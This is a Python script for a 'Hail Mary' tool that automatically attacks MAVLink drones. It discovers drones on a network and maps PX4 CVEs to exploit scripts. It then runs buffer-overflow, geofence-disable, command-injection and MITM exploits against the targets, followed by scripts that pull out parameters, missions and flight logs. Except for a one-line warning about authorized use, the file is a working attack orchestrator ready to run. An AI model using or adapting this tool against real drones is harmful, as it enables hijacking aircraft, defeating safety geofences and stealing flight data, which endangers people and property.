#!/usr/bin/env python3
"""
Hail Mary Attack - Automated Multi-Vector Drone Exploitation
Performs reconnaissance, vulnerability scanning, and intelligent exploit selection
Similar to Armitage's Hail Mary attack but specifically for drone systems
"""

import sys
import time
import json
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from pymavlink import mavutil

# Import utility modules
EXPLOITS_DIR = Path(__file__).parent.parent
sys.path.insert(0, str(EXPLOITS_DIR))
try:
    from utils.vulnerability_scanner import VulnerabilityScanner
except ImportError:
    print("[!] Warning: vulnerability_scanner not available, some features may be limited")
    VulnerabilityScanner = None

class HailMaryAttack:
    """
    Hail Mary Attack - Automated comprehensive drone exploitation
    """
    
    def __init__(self, connection_string: str = None, target_network: str = None):
        """
        Initialize Hail Mary Attack
        
        Args:
            connection_string: MAVLink connection string (e.g., 'udp:127.0.0.1:14550')
            target_network: Network to scan (e.g., '10.13.0.0/24')
        """
        self.connection_string = connection_string
        self.target_network = target_network
        self.discovered_targets = []
        self.vulnerabilities = []
        self.system_info = {}
        self.attack_results = []
        self.exploit_map = self._build_exploit_map()
    
    def _build_exploit_map(self) -> Dict[str, Dict[str, Any]]:
        """
        Build mapping of vulnerabilities to exploit scripts
        """
        return {
            'CVE-2024-40427': {
                'script': 'injection/buffer_overflow_cve_2024_40427.py',
                'severity': 'HIGH',
                'cvss': 7.9,
                'description': 'Stack buffer overflow in PX4-Autopilot v1.14.3',
                'autopilot': 'PX4',
                'versions': ['v1.14.3']
            },
            'CVE-2024-38951': {
                'script': 'injection/buffer_overflow_cve_2024_38951.py',
                'severity': 'MEDIUM',
                'cvss': 6.5,
                'description': 'MAVLink message overflow',
                'autopilot': 'PX4',
                'versions': ['v1.12.3', 'v1.14.3']
            },
            'CVE-2024-38952': {
                'script': 'injection/logger_overflow_cve_2024_38952.py',
                'severity': 'HIGH',
                'cvss': 7.5,
                'description': 'Logger buffer overflow',
                'autopilot': 'PX4',
                'versions': ['v1.12.3', 'v1.14.3']
            },
            'CVE-2025-9020': {
                'script': 'injection/use_after_free_cve_2025_9020.py',
                'severity': 'MEDIUM',
                'cvss': 4.5,
                'description': 'Use-after-free vulnerability',
                'autopilot': 'PX4',
                'versions': ['up to v1.15.4']
            },
            'CVE-2025-5640': {
                'script': 'injection/trajectory_overflow_cve_2025_5640.py',
                'severity': 'HIGH',
                'description': 'Trajectory waypoint overflow',
                'autopilot': 'PX4',
                'versions': ['v1.12.3']
            },
            'CVE-2024-29460': {
                'script': 'injection/flight_path_manipulation_cve_2024_29460.py',
                'severity': 'MEDIUM',
                'cvss': 6.6,
                'description': 'Flight path manipulation',
                'autopilot': 'PX4'
            },
            'CVE-2024-30799': {
                'script': 'injection/breach_return_point_rce_cve_2024_30799.py',
                'severity': 'MEDIUM',
                'cvss': 4.4,
                'description': 'Remote code execution via breach return point',
                'autopilot': 'PX4'
            },
            'CVE-2024-30800': {
                'script': 'injection/geofence_bypass.py',
                'severity': 'HIGH',
                'description': 'Geofence bypass vulnerability',
                'autopilot': 'PX4'
            },
            'CVE-2024-24254': {
                'script': 'injection/mission_race_condition.py',
                'severity': 'MEDIUM',
                'cvss': 4.2,
                'description': 'Race condition in mission planning',
                'autopilot': 'PX4'
            },
            'CVE-2024-24255': {
                'script': 'injection/mission_race_condition.py',
                'severity': 'MEDIUM',
                'cvss': 4.2,
                'description': 'Race condition in mission planning',
                'autopilot': 'PX4'
            },
            'CVE-2020-10282': {
                'script': 'injection/mavlink_inject.py',
                'severity': 'CRITICAL',
                'cvss': 9.8,
                'description': 'MAVLink authentication missing',
                'autopilot': 'ALL'
            },
            'MAVLink-Auth-Optional': {
                'script': 'injection/mavlink_inject.py',
                'severity': 'HIGH',
                'description': 'MAVLink 2.0 authentication optional',
                'autopilot': 'ALL'
            },
            'MAVLink-No-Encryption': {
                'script': 'mitm/mavlink_mitm.py',
                'severity': 'HIGH',
                'description': 'Unencrypted MAVLink communication',
                'autopilot': 'ALL'
            },
            'Exposed-Services': {
                'script': 'injection/companion_computer_exploit.py',
                'severity': 'MEDIUM',
                'description': 'Exposed services on companion computer',
                'autopilot': 'ALL'
            }
        }
    
    def phase1_reconnaissance(self) -> bool:
        """
        Phase 1: Automated Reconnaissance
        Discovers drones and fingerprints systems
        """
        print("="*70)
        print("PHASE 1: RECONNAISSANCE")
        print("="*70)
        print()
        
        # If connection string provided, use it directly
        if self.connection_string:
            print(f"[*] Using provided connection: {self.connection_string}")
            try:
                # Use helper function for connection
                from utils.mavlink_helper import connect_to_drone
                connection = connect_to_drone(self.connection_string, timeout=5)
                if connection is None:
                    return False
                print("[+] Connected to target")
                
                # Get system info
                msg = connection.recv_match(type='HEARTBEAT', blocking=True, timeout=2)
                if msg:
                    self.discovered_targets.append({
                        'connection': self.connection_string,
                        'system_id': msg.get_srcSystem(),
                        'autopilot': msg.autopilot,
                        'mavlink_version': msg.mavlink_version
                    })
                    return True
            except Exception as e:
                print(f"[-] Failed to connect: {e}")
                return False
        
        # Otherwise, scan network
        if self.target_network:
            print(f"[*] Scanning network: {self.target_network}")
            try:
                # Import drone discovery
                sys.path.insert(0, str(EXPLOITS_DIR / 'recon'))
                from drone_discovery import scan_network, identify_device
                
                network_base = self.target_network.split('.')[0:3]
                network_base = '.'.join(network_base)
                
                discovered = scan_network(network_base)
                
                for ip, port in discovered:
                    print(f"[*] Identifying device at {ip}:{port}...")
                    device_info = identify_device(ip, port)
                    if device_info:
                        self.discovered_targets.append({
                            'connection': f'udp:{ip}:{port}',
                            **device_info
                        })
                        print(f"[+] Identified: {device_info.get('type', 'Unknown')} "
                              f"(Autopilot: {device_info.get('autopilot', 'Unknown')})")
                
                if not self.discovered_targets:
                    print("[-] No drones discovered on network")
                    return False
                
                print(f"[+] Discovered {len(self.discovered_targets)} target(s)")
                return True
                
            except Exception as e:
                print(f"[-] Network scan failed: {e}")
                return False
        else:
            print("[-] No connection string or target network provided")
            return False
    
    def phase2_vulnerability_scanning(self) -> bool:
        """
        Phase 2: Vulnerability Scanning
        Scans discovered targets for vulnerabilities
        """
        print()
        print("="*70)
        print("PHASE 2: VULNERABILITY SCANNING")
        print("="*70)
        print()
        
        if not self.discovered_targets:
            print("[-] No targets discovered")
            return False
        
        all_vulnerabilities = []
        
        for target in self.discovered_targets:
            connection_str = target['connection']
            print(f"[*] Scanning target: {connection_str}")
            
            try:
                if VulnerabilityScanner is None:
                    print("[-] Vulnerability scanner not available")
                    continue
                    
                scanner = VulnerabilityScanner(connection_str)
                report = scanner.scan_all()
                
                if report:
                    target['vulnerabilities'] = report['vulnerabilities']
                    target['system_info'] = report['system_info']
                    all_vulnerabilities.extend(report['vulnerabilities'])
                    print(f"[+] Found {len(report['vulnerabilities'])} vulnerabilities")
                else:
                    print("[-] Scan failed for this target")
                    
            except Exception as e:
                print(f"[-] Error scanning target: {e}")
        
        self.vulnerabilities = all_vulnerabilities
        print(f"\n[+] Total vulnerabilities discovered: {len(self.vulnerabilities)}")
        
        return len(self.vulnerabilities) > 0
    
    def phase3_exploit_selection(self) -> List[Dict[str, Any]]:
        """
        Phase 3: Intelligent Exploit Selection
        Selects optimal exploits based on discovered vulnerabilities
        """
        print()
        print("="*70)
        print("PHASE 3: EXPLOIT SELECTION")
        print("="*70)
        print()
        
        selected_exploits = []
        
        # Sort vulnerabilities by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        sorted_vulns = sorted(
            self.vulnerabilities,
            key=lambda v: (severity_order.get(v.get('severity', 'LOW'), 99),
                          -v.get('cvss', 0))
        )
        
        print("[*] Selecting exploits based on discovered vulnerabilities...")
        print()
        
        for vuln in sorted_vulns:
            vuln_id = vuln.get('id', '')
            exploit_info = self.exploit_map.get(vuln_id)
            
            if exploit_info:
                # Check if exploit is applicable to target
                target = self.discovered_targets[0] if self.discovered_targets else {}
                autopilot = target.get('autopilot', '')
                
                # Match autopilot type
                if exploit_info['autopilot'] == 'ALL' or \
                   (autopilot and exploit_info['autopilot'] in str(autopilot)):
                    
                    selected_exploits.append({
                        'vulnerability': vuln,
                        'exploit': exploit_info,
                        'priority': severity_order.get(vuln.get('severity', 'LOW'), 99)
                    })
                    
                    print(f"[+] Selected: {exploit_info['script']}")
                    print(f"    Target: {vuln.get('name', vuln_id)}")
                    print(f"    Severity: {vuln.get('severity', 'UNKNOWN')}")
                    if 'cvss' in vuln:
                        print(f"    CVSS: {vuln['cvss']}")
                    print()
        
        # Add generic exploits if no specific vulnerabilities found
        if not selected_exploits:
            print("[!] No specific exploits matched. Adding generic attacks...")
            selected_exploits.append({
                'vulnerability': {'id': 'Generic', 'name': 'Generic MAVLink Attack'},
                'exploit': {
                    'script': 'injection/mavlink_inject.py',
                    'severity': 'MEDIUM',
                    'description': 'Generic MAVLink command injection'
                },
                'priority': 2
            })
        
        print(f"[+] Selected {len(selected_exploits)} exploit(s) to execute")
        return selected_exploits
    
    def phase4_exploit_execution(self, selected_exploits: List[Dict[str, Any]]) -> bool:
        """
        Phase 4: Exploit Execution
        Executes selected exploits in optimal sequence
        """
        print()
        print("="*70)
        print("PHASE 4: EXPLOIT EXECUTION")
        print("="*70)
        print()
        
        if not selected_exploits:
            print("[-] No exploits selected")
            return False
        
        if not self.discovered_targets:
            print("[-] No targets available")
            return False
        
        target = self.discovered_targets[0]
        connection_str = target['connection']
        
        success_count = 0
        
        for i, exploit_plan in enumerate(selected_exploits, 1):
            exploit_info = exploit_plan['exploit']
            vuln = exploit_plan['vulnerability']
            script_path = exploit_info['script']
            
            print(f"[*] [{i}/{len(selected_exploits)}] Executing: {script_path}")
            print(f"    Vulnerability: {vuln.get('name', 'Unknown')}")
            print(f"    Severity: {vuln.get('severity', 'UNKNOWN')}")
            
            # Resolve script path
            full_path = EXPLOITS_DIR / script_path
            if not full_path.exists():
                print(f"[-] Script not found: {full_path}")
                self.attack_results.append({
                    'exploit': script_path,
                    'success': False,
                    'error': 'Script not found'
                })
                continue
            
            # Build command
            cmd = ['python3', str(full_path), connection_str]
            
            # Add additional arguments based on exploit type
            if 'buffer_overflow' in script_path or 'overflow' in script_path:
                # Buffer overflow exploits typically just need connection
                pass
            elif 'geofence' in script_path:
                cmd.append('disable')
            elif 'mavlink_inject' in script_path:
                cmd.extend(['SET_MODE'])
            
            try:
                print(f"[*] Running: {' '.join(cmd)}")
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0:
                    print("[+] Exploit executed successfully")
                    success_count += 1
                    self.attack_results.append({
                        'exploit': script_path,
                        'success': True,
                        'output': result.stdout
                    })
                else:
                    print(f"[-] Exploit failed (exit code: {result.returncode})")
                    if result.stderr:
                        print(f"    Error: {result.stderr[:200]}")
                    self.attack_results.append({
                        'exploit': script_path,
                        'success': False,
                        'error': result.stderr
                    })
                
            except subprocess.TimeoutExpired:
                print("[-] Exploit timed out")
                self.attack_results.append({
                    'exploit': script_path,
                    'success': False,
                    'error': 'Timeout'
                })
            except Exception as e:
                print(f"[-] Error executing exploit: {e}")
                self.attack_results.append({
                    'exploit': script_path,
                    'success': False,
                    'error': str(e)
                })
            
            # Brief delay between exploits
            if i < len(selected_exploits):
                time.sleep(2)
        
        print()
        print(f"[+] Exploits executed: {success_count}/{len(selected_exploits)} successful")
        return success_count > 0
    
    def phase5_post_exploitation(self) -> bool:
        """
        Phase 5: Post-Exploitation
        Attempts to maintain access and extract data
        """
        print()
        print("="*70)
        print("PHASE 5: POST-EXPLOITATION")
        print("="*70)
        print()
        
        if not self.discovered_targets:
            return False
        
        target = self.discovered_targets[0]
        connection_str = target['connection']
        
        post_exploit_scripts = [
            ('exfiltration/parameter_extraction.py', 'Extract system parameters'),
            ('exfiltration/mission_extraction.py', 'Extract mission waypoints'),
            ('exfiltration/flight_log_extraction.py', 'Extract flight logs'),
        ]
        
        success_count = 0
        
        for script_path, description in post_exploit_scripts:
            full_path = EXPLOITS_DIR / script_path
            if not full_path.exists():
                continue
            
            print(f"[*] {description}...")
            try:
                cmd = ['python3', str(full_path), connection_str]
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=20
                )
                
                if result.returncode == 0:
                    print(f"[+] {description} completed")
                    success_count += 1
                else:
                    print(f"[-] {description} failed")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
            
            time.sleep(1)
        
        print(f"\n[+] Post-exploitation: {success_count}/{len(post_exploit_scripts)} successful")
        return success_count > 0
    
    def generate_report(self, output_file: str = None) -> Dict[str, Any]:
        """
        Generate comprehensive attack report
        """
        report = {
            'timestamp': time.time(),
            'targets_discovered': len(self.discovered_targets),
            'targets': self.discovered_targets,
            'vulnerabilities_found': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'exploits_executed': len(self.attack_results),
            'exploit_results': self.attack_results,
            'successful_exploits': len([r for r in self.attack_results if r.get('success')]),
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
                'high': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
                'medium': len([v for v in self.vulnerabilities if v.get('severity') == 'MEDIUM']),
                'low': len([v for v in self.vulnerabilities if v.get('severity') == 'LOW']),
                'exploits_successful': len([r for r in self.attack_results if r.get('success')]),
                'exploits_failed': len([r for r in self.attack_results if not r.get('success')])
            }
        }
        
        # Print summary
        print()
        print("="*70)
        print("HAIL MARY ATTACK REPORT")
        print("="*70)
        print()
        print(f"Targets Discovered: {report['targets_discovered']}")
        print(f"Vulnerabilities Found: {report['vulnerabilities_found']}")
        print(f"  Critical: {report['summary']['critical']}")
        print(f"  High: {report['summary']['high']}")
        print(f"  Medium: {report['summary']['medium']}")
        print(f"  Low: {report['summary']['low']}")
        print()
        print(f"Exploits Executed: {report['exploits_executed']}")
        print(f"  Successful: {report['summary']['exploits_successful']}")
        print(f"  Failed: {report['summary']['exploits_failed']}")
        print()
        
        # Save to file
        if output_file:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            with open(output_path, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Report saved to {output_file}")
        
        print("="*70)
        
        return report
    
    def execute_full_attack(self, output_file: str = None) -> bool:
        """
        Execute complete Hail Mary attack sequence
        """
        print()
        print("="*70)
        print("HAIL MARY ATTACK - AUTOMATED DRONE EXPLOITATION")
        print("="*70)
        print()
        print("This attack performs:")
        print("  1. Automated reconnaissance")
        print("  2. Vulnerability scanning")
        print("  3. Intelligent exploit selection")
        print("  4. Multi-vector exploit execution")
        print("  5. Post-exploitation data extraction")
        print()
        print("⚠️  WARNING: This is an automated attack. Use only on authorized systems!")
        print()
        time.sleep(2)
        
        # Phase 1: Reconnaissance
        if not self.phase1_reconnaissance():
            print("[-] Reconnaissance phase failed")
            return False
        
        # Phase 2: Vulnerability Scanning
        if not self.phase2_vulnerability_scanning():
            print("[!] No vulnerabilities found, but continuing with generic attacks...")
        
        # Phase 3: Exploit Selection
        selected_exploits = self.phase3_exploit_selection()
        
        if not selected_exploits:
            print("[-] No exploits selected")
            return False
        
        # Phase 4: Exploit Execution
        if not self.phase4_exploit_execution(selected_exploits):
            print("[!] Some exploits failed, but continuing...")
        
        # Phase 5: Post-Exploitation
        self.phase5_post_exploitation()
        
        # Generate Report
        self.generate_report(output_file)
        
        return True

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 hail_mary_attack.py <connection|network> [options]")
        print()
        print("Arguments:")
        print("  connection    MAVLink connection string (e.g., 'udp:127.0.0.1:14550')")
        print("  OR")
        print("  network      Network to scan (e.g., '10.13.0.0/24')")
        print()
        print("Options:")
        print("  --output <file>    Save attack report to file (JSON)")
        print()
        print("Examples:")
        print("  python3 hail_mary_attack.py udp:127.0.0.1:14550")
        print("  python3 hail_mary_attack.py 10.13.0.0/24")
        print("  python3 hail_mary_attack.py udp:127.0.0.1:14550 --output report.json")
        sys.exit(1)
    
    target = sys.argv[1]
    output_file = None
    
    # Parse options
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--output' and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            i += 2
        else:
            i += 1
    
    # Determine if target is connection string or network
    if ':' in target or target.startswith('udp:') or target.startswith('tcp:'):
        connection_string = target
        target_network = None
    else:
        connection_string = None
        target_network = target
    
    # Execute Hail Mary attack
    attack = HailMaryAttack(connection_string, target_network)
    success = attack.execute_full_attack(output_file)
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
